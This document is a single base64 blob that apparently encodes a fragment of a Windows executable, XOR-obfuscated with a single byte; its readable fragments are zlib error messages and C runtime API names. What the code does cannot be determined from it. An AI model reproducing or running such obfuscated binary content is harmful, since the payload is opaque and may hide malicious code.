FxcXFxeHAhcHExcTFx8XExc3ABcHExcSFwcXHxc3ABcHExcRFzcXNxc3ABcHExcTFwcXBxdHDRcHHxcHFzcXNxdHDRcHHxcHF5cXlxdHDRcHHxc3F5cXFxZHDRcHNxeXFxUWFxNHDRcHNxcVFhUWFwdHDRcHJjklOS8XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxcWFxcXFhcXFxYXFxcVFxcXFRcXFxUXFxcVFxcXFBcXFxQXFxcUFxcXFBcXFxMXFxcTFxcXExcXFxMXFxcSFxcXEhcXFxIXFxcSFxcXFxcXFwcGBRcfEB4RHRIcExsUGhUZFhgXFxcXFxcXFxcXFxcXFxcXFxYXFxcWFxcXFRcXFxUXFxcUFxcXFBcXFxMXFxcTFxcXEhcXFxIXFxcRFxcXERcXFxAXFxcQFxcXHxcXFx8XFxceFxcXHhcXFx0XFxcdFxcXHBcXFxwXFxcbFxcXGxcXFxoXFxcaFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxUXFxcUFxcXEBcXFxcXFxcbFx8XmxcfF1sXHxfbFx8XOxcfF7sXHxd7Fx8X+xcfFwsXHxeLFx8XSxcfF8sXHxcrFx8XqxcfF2sXHxfrFx8XFRcfF5UXHxdVFx8X1RcfFzUXHxe1Fx8XdRcfF/UXHxcFFx8XhRcfF0UXHxfFFx8XJRcfF6UXHxdlFx8X5RcfFx0XHxedFx8XXRcfF90XHxc9Fx8XvRcfF30XHxf9Fx8XDRcfF40XHxdNFx8XzRcfFy0XHxetFx8XbRcfF+0XHxcRFx8XkRcfF1EXHxfRFx8XMRcfF7EXHxdxFx8X8RcfFwEXHxeBFx8XQRcfF8EXHxchFx8XoRcfF2EXHxfhFx8XGRcfF5kXHxdZFx8X2RcfFzkXHxe5Fx8XeRcfF/kXHxcJFx8XiRcfF0kXHxfJFx8XKRcfF6kXHxdpFx8X6RcfFxYXHxeWFx8XVhcfF9YXHxc2Fx8XthcfF3YXHxf2Fx8XBhcfF4YXHxdGFx8XxhcfFyYXHxemFx8XZhcfF+YXHxceFx8XnhcfF14XHxfeFx8XPhcfF74XHxd+Fx8X/hcfFw4XHxeOFx8XThcfF84XHxcuFx8XrhcfF24XHxfuFx8XEhcfF5IXHxdSFx8X0hcfFzIXHxeyFx8XchcfF/IXHxcCFx8XghcfF0IXHxfCFx8XIhcfF6IXHxdiFx8X4hcfFxoXHxeaFx8XWhcfF9oXHxc6Fx8XuhcfF3oXHxf6Fx8XChcfF4oXHxdKFx8XyhcfFyoXHxeqFx8XahcfF+oXHxcEFx4XBBYeF4QXHheEFh4XRBceF0QWHhfEFx4XxBYeFyQXHhckFh4XpBceF6QWHhdkFx4XZBYeF+QXHhfkFh4XHBceFxwWHhecFx4XnBYeF1wXHhdcFh4X3BceF9wWHhc8Fx4XPBYeF7wXHhe8Fh4XfBceF3wWHhf8Fx4X/BYeFwwXHhcMFh4XjBceF4wWHhdMFx4XTBYeF8wXHhfMFh4XLBceFywWHhesFx4XrBYeF2wXHhdsFh4X7BceF+wWHhcQFx4XEBYeF5AXHheQFh4XUBceF1AWHhfQFx4X0BYeFzAXHhcwFh4XsBceF7AWHhdwFx4XcBYeF/AXHhfwFh4XABceFwAWHheAFx4XgBYeF0AXHhdAFh4XwBceF8AWHhcgFx4XIBYeF6AXHhegFh4XYBceF2AWHhfgFx4X4BYeFxgXHhcYFh4XmBceF5gWHhdYFx4XWBYeF9gXHhfYFh4XOBceFzgWHhe4Fx4XuBYeF3gXHhd4Fh4X+BceF/gWHhcIFx4XCBYeF4gXHheIFh4XSBceF0gWHhfIFx4XyBYeFygXHhcoFh4XqBceF6gWHhdoFx4XaBYeF+gXHhfoFh4XFxcQF1cXEBc3FxAXdxcQFwcXEBdHFxAXJxcQF2cXEBcfFxAXXxcQFz8XEBd/FxAXDxcQF08XEBcvFxAXbxcQFxMXEBdTFxAXMxcQF3MXEBcDFxAXQxcQFyMXEBdjFxAXFBcfF5QXHxdUFx8X1BcfFzQXHxe0Fx8XdBcfF/QXHxcXFxIXBxcSFx8XEhcPFxIXExcSFwMXEhcbFxIXCxcSFxUXEhcFFxIXHRcSFw0XEhcRFxIXARcSFxkXEhcJFxIXFhcSFwYXEhceFxIXDhcSFxIXEhcCFxIXGhcSFwoXEhcUFxIXBBcSFxwXEhcMFxIXEBcSFwAXEhcXFhUUExMSEhEREREQEBAQHx8fHx8fHx8eHh4eHh4eHh0dHR0dHR0dHR0dHR0dHR0cHBwcHBwcHBwcHBwcHBwcGxsb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